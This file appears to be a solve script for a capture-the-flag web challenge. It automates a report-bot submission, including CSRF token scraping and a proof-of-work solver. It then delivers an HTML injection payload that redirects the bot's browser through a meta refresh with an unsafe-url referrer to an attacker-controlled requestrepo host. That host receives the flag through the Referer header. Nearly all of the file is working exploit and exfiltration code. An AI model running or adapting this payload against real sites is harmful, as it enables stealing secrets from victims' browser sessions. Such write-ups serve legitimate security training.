import re
import sys
import time
import hashlib
import requests
import requestrepo

from html.parser import HTMLParser
from base64 import b64encode as b64e
from urllib.parse import unquote_plus

BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:80"

# start report.py

class CSRFTokenParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.csrf_token = None
    
    def handle_starttag(self, tag, attrs):
        if tag == 'input':
            attrs_dict = dict(attrs)
            if attrs_dict.get('name') == 'csrf_token':
                self.csrf_token = attrs_dict.get('value')


def get_csrf_token(session, base_url):
    try:
        response = session.get(f"{base_url}/login", verify=False)
        response.raise_for_status()
        
        parser = CSRFTokenParser()
        parser.feed(response.text)
        
        if parser.csrf_token:
            return parser.csrf_token
        
        if 'csrf_token' in session.cookies:
            return session.cookies['csrf_token']
        
        print("Warning: Could not extract CSRF token from page")
        return None
    except Exception as e:
        print(f"Error fetching CSRF token: {e}")
        return None


def get_pow_challenge(session, base_url):
    response = session.get(f"{base_url}/report/pow", verify=False)
    response.raise_for_status()
    return response.json()

def count_leading_zero_bits(data: bytes) -> int:
    bits = 0
    for byte in data:
        if byte == 0:
            bits += 8
            continue
        
        for i in range(7, -1, -1):
            if (byte & (1 << i)) == 0:
                bits += 1
            else:
                return bits
    return bits

def solve_pow(token: str, difficulty: int) -> str:
    print(f"Solving PoW challenge (difficulty: {difficulty})...")
    start_time = time.time()
    
    nonce = 0
    while True:
        hash_input = f"{token}.{nonce}"
        
        hash_bytes = hashlib.sha256(hash_input.encode()).digest()
        
        leading_zeros = count_leading_zero_bits(hash_bytes)
        
        if leading_zeros >= difficulty:
            elapsed = time.time() - start_time
            print(f"PoW solved! Nonce: {nonce}, Time: {elapsed:.2f}s")
            return str(nonce)
        
        nonce += 1
        
        if nonce % 100000 == 0:
            elapsed = time.time() - start_time
            rate = nonce / elapsed if elapsed > 0 else 0
            print(f"Trying nonce {nonce:,} (rate: {rate:,.0f}/s)")

def submit_url(base_url, url):
    session = requests.Session()
    
    print("Fetching CSRF token...")
    csrf_token = get_csrf_token(session, base_url)
    if not csrf_token:
        print("Warning: Proceeding without CSRF token")
    else:
        print(f"CSRF token obtained: {csrf_token[:20]}...")
    
    print("Fetching PoW challenge...")
    challenge = get_pow_challenge(session, base_url)
    print(f"Challenge: {challenge}")
    
    nonce = solve_pow(challenge['token'], challenge['difficulty'])
    
    pow_solution = {
        'token': challenge['token'],
        'nonce': nonce,
        'sig': challenge['sig'],
        'expires': challenge['expires'],
        'difficulty': challenge['difficulty']
    }
    
    payload = {
        'url': url,
        'pow': pow_solution
    }
    
    print("Submitting report...")
    
    headers = {
        'Content-Type': 'application/json'
    }
    
    if csrf_token:
        headers['X-CSRFToken'] = csrf_token
    
    response = session.post(
        f"{base_url}/report",
        json=payload,
        headers=headers,
        verify=False
    )
    
    if response.status_code == 200:
        result = response.text
        print(f"Success: {result}")
        return result
    else:
        error_msg = f"Error {response.status_code}: {response.text}"
        print(error_msg)
        raise Exception(error_msg)

# end report.py

client = requestrepo.RequestRepo(host="r.babelo.xyz", port=8000, protocol="http")

token = client.token
domain = client.domain

URL = f"{client._Requestrepo__protocol}://{client._Requestrepo__host}:{client._Requestrepo__port}"

index_html = fr"""

<script>

let payload = `

<form action="/search" method="GET" id=myform name=forms>
  <input name="query" value="<meta name='referrer' content='unsafe-url'><meta http-equiv='Refresh' content='0; url=http://{domain}:8000/leak'>">
</form>
<form name=forms></form>

<script src="/static/validators.js"><\/script>
<script src="https://js.hcaptcha.com/1/api.js?onload=checkForm&render=explicit"><\/script>

<textarea form="myform" name="leak">

`;

location = "http://localhost/search?query=%00" + encodeURIComponent(payload);


</script>

"""

json_data = {
        "index.html": {
            "raw": b64e(index_html.encode()),
            "headers": [
                {"header": "Access-Control-Allow-Origin", "value": "*"},
                {"header": "Content-Type", "value": "text/html; charset=utf-8"},
            ],
            "status_code": 200
        },
    }

response = requests.post(
    f"{URL}/api/files",
    params={"token": token},
    json=json_data,
)

response.raise_for_status()

submit_url(BASE_URL, f"http://{domain}:8000")

flag = None

for _ in range(16):
    request = client.get_request()
    if request.type == "http":
        headers = request.headers
        if "referer" in headers:
            leak = unquote_plus(headers["referer"])
            
            match = re.search(r"space\{\w+\}", leak)
            if match is not None:
                flag = match.group(0)
                break

    else:
        print(request.reply)

else:
    raise RuntimeError("Error while getting the flag: no flag found in referer header")

print("FLAG:",flag)   
